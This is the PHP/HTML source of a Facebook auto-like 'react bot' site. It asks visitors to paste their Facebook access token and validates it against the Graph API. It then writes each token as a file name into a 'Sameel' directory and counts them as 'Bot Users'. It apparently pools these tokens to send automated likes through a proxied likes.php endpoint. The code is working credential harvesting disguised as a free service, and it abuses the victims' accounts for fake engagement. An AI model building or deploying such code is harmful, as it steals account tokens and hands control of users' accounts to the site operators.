 ﻿<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>| ❤ Hussein and 7oOka ❤ |</title>

<link rel="stylesheet" type="text/css" href="toqeer.css" media="all,handheld"/>

<link href="https://fonts.googleapis.com/css?family=Bungee+Shade|Monoton|Nova+Square" rel="stylesheet"/>
<link rel="shortcut icon" type="image/png" href="https://static.xx.fbcdn.net/images/emoji.php/v9/fa/1/16/1f981.png"/>
<meta name="viewport" content="width=device-width, initial-scale=1"/>

</head>

<div id="header"><script src="toqeer.js"></script><hr></div>

<center><marquee direction="left" width="60%"> -Hussein H. Hamdy ^ 7oOkA-X <font color ="red">❤️</font> LOVE REACT BOT SITE <font color =Blue">❤️</font> OWNER OF Hussein and 7oOka</marquee></center></br>
<hr width="60%"></br>

<?php
$yx=opendir('hussein');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Sameel($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Sameel($access){
if(!is_dir('Sameel')){
mkdir('Sameel');
}
$a=fopen('Sameel/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '


		<div class="panel panel-success">

		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>


<h1 class="heading">
<marquee behavior="alternate"<h6>
<font face="Battle Beasts" size="12"> <script src="Kashan.js"></script>
</h6></marquee><br>


		</div>

<center>
<div id="content">
<br><br>
<center>
<div class="HUSS2">
 <a href="https://www.facebook.com/100000481004614" alt="Hussein" target="_blank">
<img src="https://graph.facebook.com/100000481004614/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(255, 0, 0); padding: 8px;" width="240" height="240"></a>
 <a href="https://www.facebook.com/100010376239278" alt="HUSSEIN HAMDY" target="_blank">
<img src="https://graph.facebook.com/100010376239278/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(255, 0, 0); padding: 8px;" width="120" height="120"></a>
 _
 <a href="https://www.facebook.com/100000481004614" alt="Hussein" target="_blank">
<img src="https://graph.facebook.com/100000481004614/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(255, 0, 0); padding: 8px;" width="120" height="120"></a>
 <a href="https://www.facebook.com/100010376239278" alt="HUSSEIN HAMDY" target="_blank">
<img src="https://graph.facebook.com/100010376239278/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(255, 0, 0); padding: 8px;" width="240" height="240"></a>
</marquee>
<br>
<br>


<br>
<center><a class="button" href="http://hussein-bots.com/HuongDan/token.php" target="blank">Click Here to Get Token</a></center>

</font><br>
<form action="" method="POST">
<input class="search" style="width:70%" type="text" name="access_token" placeholder="Input Token Here" required></br>
<input class="submit" type="submit" name="saveFile" value="Submit"></form>
</font><br>
<br>


</body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'


<div class="panel panel-success">

		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Completely Fixed!! No Like and Comment Block</h4></div>

		</div>
<br>
<div id="navigation-menu">
<center>
     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="submit" type="submit" value="Click Here To Add Othe Token"></center>
<br>
<br>
<br>

</center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
	<br>
<center><font size="5" color="red"><?php
    // integer starts at 0 before counting
    $i = 0;
    $dir = 'Sameel/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file))
                $i++;
        }
    }
    // prints out how many were in the directory
     echo "Bot Users : $i";
?><br></font></p></h2>


 <div class="post-meta2">
<div class="footersahib">    <center><font color=""><script type="text/javascript"> function toSpans(span) { var str=span.firstChild.data; var a=str.length; span.removeChild(span.firstChild); for(var i=0; i<a; i++) { var theSpan=document.createElement("SPAN"); theSpan.appendChild(document.createTextNode(str.charAt(i))); span.appendChild(theSpan); } } function RainbowSpan(span, hue, deg, brt, spd, hspd) { this.deg=(deg==null?360:Math.abs(deg)); this.hue=(hue==null?0:Math.abs(hue)%360); this.hspd=(hspd==null?3:Math.abs(hspd)%360); this.length=span.firstChild.data.length; this.span=span; this.speed=(spd==null?50:Math.abs(spd)); this.hInc=this.deg/this.length; this.brt=(brt==null?255:Math.abs(brt)%256); this.timer=null; toSpans(span); this.moveRainbow(); } RainbowSpan.prototype.moveRainbow = function() { if(this.hue>359) this.hue-=360; var color; var b=this.brt; var a=this.length; var h=this.hue; for(var i=0; i<a; i++) { if(h>359) h-=360; if(h<60) { color=Math.floor(((h)/60)*b); red=b;grn=color;blu=0; } else if(h<120) { color=Math.floor(((h-60)/60)*b); red=b-color;grn=b;blu=0; } else if(h<180) { color=Math.floor(((h-120)/60)*b); red=0;grn=b;blu=color; } else if(h<240) { color=Math.floor(((h-180)/60)*b); red=0;grn=b-color;blu=b; } else if(h<300) { color=Math.floor(((h-240)/60)*b); red=color;grn=0;blu=b; } else { color=Math.floor(((h-300)/60)*b); red=b;grn=0;blu=b-color; } h+=this.hInc; this.span.childNodes[i].style.color="rgb("+red+", "+grn+", "+blu+")"; } this.hue+=this.hspd; } </script> <b><center><font size="6"></head><body><div style="font-face;Iceland;font-size: 40pt;text-shadow: 0 0 11px #66FFFF, 0 0 11px #66FFFF, 0 0 11px #66FFFF;color: #FFF"><strong><center><font-face;Iceland;" size="10" id="r3">Design By ¦ Hussein And 7oOka</font><strong></center> <script type="text/javascript">var r3=document.getElementById("r3"); var myRainbowSpan2=new RainbowSpan(r3, 0, 360, 255, 50, 348); myRainbowSpan2.timer=window.setInterval("myRainbowSpan2.moveRainbow()", myRainbowSpan2.speed); </script>
</body>
</html>


  <audio controls autoplay>
      <source src="https://c.top4top.net/m_752k9q2p0.mp3">
type="audio/mpeg">
  Your browser does not support the audio element.
</audio>
</span>
</div><br>


